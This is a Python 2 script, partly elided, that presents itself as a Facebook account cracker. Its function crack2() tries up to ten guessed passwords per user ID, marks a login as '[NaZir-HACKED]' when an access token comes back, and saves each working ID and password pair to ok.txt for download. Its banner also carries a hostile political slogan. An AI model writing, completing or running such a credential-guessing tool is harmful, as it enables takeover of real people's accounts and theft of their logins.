...
#coding=utf-8
#originally written by Xami King
try:
...
banner = """
        ...
        \033[1;92m      ▐░▌     ▐░░░░░░░░░░░▌▐░▌       ▐░▌
        \033[1;93m        ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀ 
        \033[1;94m 000   9999  888
        \033[1;95m 0  00 9   9 8   8 
        \033[1;92m0 0 0  9999  888
        \033[1;93m00  0    9  8   8
        \033[1;94m 000    9    888
        \033[1;95m
      \033[1;96m         [|;Â¤;|]   For
        \033[1;97m       [|[Â¤]|]       You
          \033[1;92m     [|;Â¤;|]           NaZir JaNi
        \033[1;93m       [|[Â¤]|]
          \033[1;94m     [|;Â¤;|]
           \033[1;95m    [|[Â¤]|]
           \033[1;97m    [|;Â¤;|]      __
         ...
         \033[1;93m      [|;Â¤;|]
          ...
          \033[1;96m       \|/      
  \033[1;91m                V    
\033[1;93m               Israel is a Terrorist Country        
\x1b[1;95m------------------------------------------------------

\x1b[1;96mâž£ FeL Me BaBy Logx - NaZiro QinGx

\x1b[1;92mâž£ NAME :           ðŸ’— NaZir KHaNðŸ’—
\x1b[1;95mâž£ SEARCH FACEBOOK ID :  AjMaL SHaH
...
def tool_login():
    ...
    if username =="TOOr":
        ...
        print banner
        print
        print ("[âœ“] Username : TOOr(Correct)")
        ...
        if passwordss =="TOOr":
            ...
            print 
            print ("[âœ“] Username : TOOr  (Correct)")
            print ("[âœ“] Password : TOOr  (Correct)")
            time.sleep(1)
            print('')
...
def crack2():
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		    	...
		    	if "access_token" in d:
		            print("\x1b[1;92m[NaZir-HACKED] \033[1;30m"+uid+" | "+pass1+"\x1b[1;0m")
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                if 'access_token' in d:
		                    print("\x1b[1;92m[NaZir-HACKED] \033[1;30m"+uid+" | "+pass2+"\x1b[1;0m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        if 'access_token' in d:
		                            print(" \x1b[1;92m[NaZir-HACKED] \033[1;30m"+uid+" | "+pass3+"\x1b[1;0m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                if 'access_token' in d:
		                                    print("\x1b[1;92m[NaZir-HACKED] \033[1;30m"+uid+" | "+pass4+"\x1b[1;0m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        if 'access_token' in d:
		                                            print("\x1b[1;92m[NaZir-HACKED] \033[1;30m"+uid+" | "+pass5+"\x1b[1;0m")
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                if 'access_token' in d:
		                                                    print("\x1b[1;92m[NaZir-HACKED] \033[1;30m"+uid+" | "+pass6+"\x1b[1;0m")
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            print("\x1b[1;92m[NaZir-HACKED] \033[1;30m"+uid+" | "+pass7+"\x1b[1;0m")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
                                                                            ...
                                                                            if 'www.facebook.com' in d['error_msg']:
                                                                                ...
                                                                                if 'access_token' in d:
                                                                                    print("\x1b[1;92m[NaZir-HACKED] \033[1;30m"+uid+" | "+pass10+"\x1b[1;0m")
                                                                                    ok=open("ok.txt","a")
                                                                                    ok.write(uid+" | "+pass10+"\n")
                                                                                    ok.close()
                                                                                    oks.append(uid)
	...
	down()
def down():
    dow = raw_input("[?] Do You Want To Download Cp File? (Yes/No) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print banner
        download()
